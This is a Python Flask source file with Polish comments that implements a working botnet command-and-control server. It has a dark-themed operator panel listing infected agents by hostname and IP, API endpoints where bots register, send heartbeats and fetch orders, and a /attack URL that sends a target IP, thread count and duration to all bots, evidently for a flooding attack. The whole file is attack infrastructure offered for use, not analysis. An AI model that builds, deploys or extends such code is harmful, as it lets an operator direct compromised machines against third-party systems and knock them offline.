import os
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Przechowujemy agentów w pamięci (słownik)
agents = {}  # {agent_id: {'last_seen': czas, 'ip': '1.1.1.1', ...}}
current_attack = None  # {'target': 'ip', 'threads': 100, 'duration': 60, 'start_time': timestamp}

# ==================== HTML PANELU ====================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Botnet C2 Panel</title>
    <style>
        body { font-family: Arial; background: #0a0e27; color: white; }
        .container { max-width: 1200px; margin: auto; padding: 20px; }
        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 20px; margin: 20px 0; }
        .card { background: #1a1f3a; padding: 20px; border-radius: 10px; }
        .online { color: #2ecc71; }
        .offline { color: #e74c3c; }
        .attacking { color: #f39c12; animation: pulse 1s infinite; }
        table { width: 100%; background: #1a1f3a; border-radius: 10px; }
        th { background: #2a2f4a; padding: 10px; }
        td { padding: 10px; border-bottom: 1px solid #2a2f4a; }
        .attack-info { background: #1a1f3a; padding: 15px; border-radius: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 BOTNET C2 PANEL</h1>
        
        <div class="stats">
            <div class="card">
                <h3>Wszystkie boty</h3>
                <h2>{{ total }}</h2>
            </div>
            <div class="card">
                <h3>Online (60s)</h3>
                <h2 class="online">{{ online }}</h2>
            </div>
            <div class="card">
                <h3>Atakuje</h3>
                <h2 class="attacking">{{ attacking }}</h2>
            </div>
        </div>
        
        <div class="attack-info">
            <h3>🔥 AKTYWNY ATAK</h3>
            {% if attack %}
                <p>Cel: <strong>{{ attack.target }}</strong></p>
                <p>Rozpoczęty: {{ attack.start_time }}</p>
                <p>Pozostało: {{ attack.remaining }}s</p>
                <p>Boty atakujące: {{ attacking }}</p>
            {% else %}
                <p>Brak aktywnego ataku</p>
            {% endif %}
        </div>
        
        <h2>📋 LISTA AGENTÓW</h2>
        <table>
            <tr>
                <th>ID</th>
                <th>Hostname</th>
                <th>IP</th>
                <th>Status</th>
                <th>Ostatni kontakt</th>
            </tr>
            {% for agent in agents %}
            <tr>
                <td>{{ agent.id }}</td>
                <td>{{ agent.hostname }}</td>
                <td>{{ agent.ip }}</td>
                <td class="{% if agent.status == 'online' %}online{% elif agent.status == 'attacking' %}attacking{% else %}offline{% endif %}">
                    {{ agent.status }}
                </td>
                <td>{{ agent.last_seen }}</td>
            </tr>
            {% endfor %}
        </table>
    </div>
</body>
</html>
'''

# ==================== API DLA AGENTÓW ====================

@app.route('/api/register', methods=['POST'])
def register():
    """Agent się rejestruje"""
    data = request.json
    agents[data['id']] = {
        'last_seen': time.time(),
        'hostname': data.get('hostname', 'unknown'),
        'ip': data.get('ip', 'unknown'),
        'platform': data.get('platform', 'unknown'),
        'attacking': False
    }
    return jsonify({'status': 'ok'})

@app.route('/api/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    """Agent wysyła sygnał życia"""
    if agent_id in agents:
        agents[agent_id]['last_seen'] = time.time()
        agents[agent_id]['attacking'] = request.json.get('attacking', False)
    return jsonify({'status': 'ok'})

@app.route('/api/orders/<agent_id>')
def get_orders(agent_id):
    """Agent pyta co ma robić"""
    if current_attack and time.time() - current_attack['start_time'] < current_attack['duration']:
        return jsonify({
            'target_ip': current_attack['target'],
            'threads': current_attack['threads'],
            'duration': current_attack['duration']
        })
    return jsonify({'stop': True})

# ==================== KONTROLA PRZEZ HTTP ====================

@app.route('/')
def index():
    """Główny panel"""
    now = time.time()
    online_count = 0
    attacking_count = 0
    agents_list = []
    
    for aid, data in agents.items():
        status = 'offline'
        if now - data['last_seen'] < 60:
            status = 'online'
            online_count += 1
            if data.get('attacking'):
                status = 'attacking'
                attacking_count += 1
        
        agents_list.append({
            'id': aid[:8],  # skrócone ID
            'hostname': data['hostname'],
            'ip': data['ip'],
            'status': status,
            'last_seen': datetime.fromtimestamp(data['last_seen']).strftime('%H:%M:%S')
        })
    
    # Info o ataku
    attack_info = None
    if current_attack:
        elapsed = time.time() - current_attack['start_time']
        if elapsed < current_attack['duration']:
            attack_info = {
                'target': current_attack['target'],
                'start_time': datetime.fromtimestamp(current_attack['start_time']).strftime('%H:%M:%S'),
                'remaining': int(current_attack['duration'] - elapsed)
            }
    
    return render_template_string(
        HTML_TEMPLATE,
        total=len(agents),
        online=online_count,
        attacking=attacking_count,
        agents=agents_list,
        attack=attack_info
    )

@app.route('/attack')
def start_attack():
    """Rozpocznij atak (przez URL)"""
    global current_attack
    
    target = request.args.get('target')
    duration = int(request.args.get('duration', 60))
    threads = int(request.args.get('threads', 100))
    
    if not target:
        return "Błąd: podaj target np. ?target=1.1.1.1"
    
    current_attack = {
        'target': target,
        'duration': duration,
        'threads': threads,
        'start_time': time.time()
    }
    
    return f"""
    <h2>✅ Atak rozpoczęty!</h2>
    <p>Cel: {target}</p>
    <p>Czas: {duration}s</p>
    <p>Wątki: {threads}</p>
    <p>Boty online: {sum(1 for a in agents.values() if time.time() - a['last_seen'] < 60)}</p>
    <p><a href='/'>Wróć do panelu</a></p>
    """

@app.route('/stop')
def stop_attack():
    """Zatrzymaj atak"""
    global current_attack
    current_attack = None
    return "Atak zatrzymany. <a href='/'>Wróć</a>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
